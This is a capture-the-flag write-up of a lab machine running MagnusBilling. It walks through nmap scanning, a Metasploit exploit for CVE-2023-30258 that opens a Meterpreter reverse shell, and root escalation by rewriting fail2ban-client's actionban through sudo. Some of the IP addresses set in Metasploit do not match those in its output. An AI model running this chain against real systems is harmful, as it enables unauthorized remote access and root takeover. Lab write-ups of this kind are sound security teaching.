# Billing

**Category :** exploitation/privilege escalation

**Difficulty :** Easy

**Description :** "Gain a shell, find the way and escalate your privileges!"

---

First we list all the open ports on the target IP.

```bash
simsdu@laptop:~$ nmap -p1-65535 10.66.182.59 -T5 -vv
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 12:26 CET
Initiating Ping Scan at 12:26
Scanning 10.66.182.59 [4 ports]
Completed Ping Scan at 12:26, 0.18s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:26
Completed Parallel DNS resolution of 1 host. at 12:26, 0.00s elapsed
Initiating SYN Stealth Scan at 12:26
Scanning 10.66.182.59 [65535 ports]
Discovered open port 22/tcp on 10.66.182.59
Discovered open port 80/tcp on 10.66.182.59
Discovered open port 3306/tcp on 10.66.182.59
Increasing send delay for 10.66.182.59 from 0 to 5 due to 394 out of 984 dropped probes since last increase.
Warning: 10.66.182.59 giving up on port because retransmission cap hit (2).
SYN Stealth Scan Timing: About 7.18% done; ETC: 12:33 (0:06:41 remaining)
SYN Stealth Scan Timing: About 26.94% done; ETC: 12:35 (0:06:17 remaining)
SYN Stealth Scan Timing: About 34.81% done; ETC: 12:35 (0:05:50 remaining)
SYN Stealth Scan Timing: About 42.47% done; ETC: 12:35 (0:05:22 remaining)
SYN Stealth Scan Timing: About 47.98% done; ETC: 12:35 (0:04:51 remaining)
Discovered open port 5038/tcp on 10.66.182.59
SYN Stealth Scan Timing: About 53.59% done; ETC: 12:35 (0:04:18 remaining)
SYN Stealth Scan Timing: About 58.77% done; ETC: 12:35 (0:03:50 remaining)
SYN Stealth Scan Timing: About 63.98% done; ETC: 12:35 (0:03:22 remaining)
SYN Stealth Scan Timing: About 69.08% done; ETC: 12:35 (0:02:54 remaining)
SYN Stealth Scan Timing: About 74.46% done; ETC: 12:35 (0:02:24 remaining)
SYN Stealth Scan Timing: About 79.93% done; ETC: 12:36 (0:01:54 remaining)
SYN Stealth Scan Timing: About 85.40% done; ETC: 12:35 (0:01:23 remaining)
SYN Stealth Scan Timing: About 90.72% done; ETC: 12:36 (0:00:53 remaining)
Completed SYN Stealth Scan at 12:36, 591.69s elapsed (65535 total ports)
Nmap scan report for 10.66.182.59
Host is up, received echo-reply ttl 62 (0.12s latency).
Scanned at 2025-12-04 12:26:32 CET for 592s
Not shown: 65525 closed tcp ports (reset)
PORT      STATE    SERVICE REASON
22/tcp    open     ssh     syn-ack ttl 62
80/tcp    open     http    syn-ack ttl 62
3306/tcp  open     mysql   syn-ack ttl 62
5038/tcp  open     unknown syn-ack ttl 62
14324/tcp filtered unknown no-response
29403/tcp filtered unknown no-response
31895/tcp filtered unknown no-response
45074/tcp filtered unknown no-response
51397/tcp filtered unknown no-response
53473/tcp filtered unknown no-response
```

Now let's list all the services running on these open ports.

```bash
simsdu@laptop:~$ nmap -sC -sV -p22,80,3306,5038 10.66.182.59
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 13:11 CET
Nmap scan report for 10.66.182.59
Host is up (0.12s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 f8:25:6a:c3:b3:68:40:dd:11:4f:4c:f1:4e:0c:61:18 (ECDSA)
|_  256 2e:7c:7d:56:39:48:59:d8:52:d5:94:39:9c:bb:0c:b1 (ED25519)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
|_http-server-header: Apache/2.4.62 (Debian)
| http-title:             MagnusBilling        
|_Requested resource was http://10.66.182.59/mbilling/
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.82 seconds
```

I use `searchsploit`  with magnusbilling to see if there is a known exploitation.

```bash
simsdu@laptop:~$ searchsploit magnusbilling
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
MagnusSolution magnusbilling 7.3.0 - Command Injection                 | multiple/webapps/52170.txt
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

That's gret, now let's use metasploit to exploit it

```bash
simsdu@laptop:~$ msfconsole

[...]

msf > search magnusbilling

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258  2023-06-26       excellent  Yes    MagnusBilling application unauthenticated Remote Command Execution.


msf > use 0
[*] Using configured payload php/meterpreter/reverse_tcp
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set RHOST 10.66.171.28
RHOST => 10.66.171.28
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > set LHOST 192.168.1.17
LHOST =>  192.168.153.94
msf exploit(linux/http/magnusbilling_unauth_rce_cve_2023_30258) > run
[*] Started reverse TCP handler on 192.168.153.94:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if 10.66.182.59:80 can be exploited.
[*] Performing command injection test issuing a sleep command of 6 seconds.
[*] Elapsed time: 6.3 seconds.
[+] The target is vulnerable. Successfully tested command injection.
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (41224 bytes) to 10.66.182.59
[+] Deleted VIxYKJRQ.php
[*] Meterpreter session 2 opened (192.168.153.94:4444 -> 10.66.182.59:45972) at 2025-12-04 13:46:47 +0100

meterpreter > shell
Process 4225 created.
Channel 0 created.
```

The exploit works, let's upgrade and have a cleaner shell, and navigate.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash");'
asterisk@ip-10-66-182-59:/var/www/html/mbilling/lib/icepay$ cd /home
cd /home
asterisk@ip-10-66-182-59:/home$
debian magnus ssm-user
asterisk@ip-10-66-182-59:/home$ cd magnus
asterisk@ip-10-66-182-59:/home/magnus$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
asterisk@ip-10-66-182-59:/home/magnus$ cat user.txt    
First_flag_here
```

We have the first flag. The second one is in the /root directorty. We have to escalate privileges to be able to read it, with the `sudo -l` command we can list see what action we can do with sudo.

```bash
asterisk@ip-10-66-182-59:/home$ sudo -l
Matching Defaults entries for asterisk on ip-10-66-182-59:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-66-182-59:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client


asterisk@ip-10-66-182-59:/home$ fail2ban-client --version
Fail2Ban v1.0.2
```

Fail2ban is a service that prevent against brute-force attacks by banning IP address who gives wrong credentials multiple times. Because we have sudo on Fail2ban,it has access to the /root directory. We can modify the action it does to print us the /root/root.txt file we need. 
We have to change the action "actionban" does by printing the /root/root.txt in a /tmp directory and give us the righ to read it.

```bash
asterisk@ip-10-66-182-59:/home$ sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt '"
```

now if we try to ban an ip address, it will run our "script" instead.

```bash
asterisk@ip-10-66-182-59:/home$ cd /tmp
cd /tmp
asterisk@ip-10-66-182-59:/tmp$ sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
1
asterisk@ip-10-66-182-59:/tmp$ ls
ls
root.txt
asterisk@ip-10-66-182-59:/tmp$ cat root.txt
Second_flag_here
```

We have succesfully print the second and last flag.
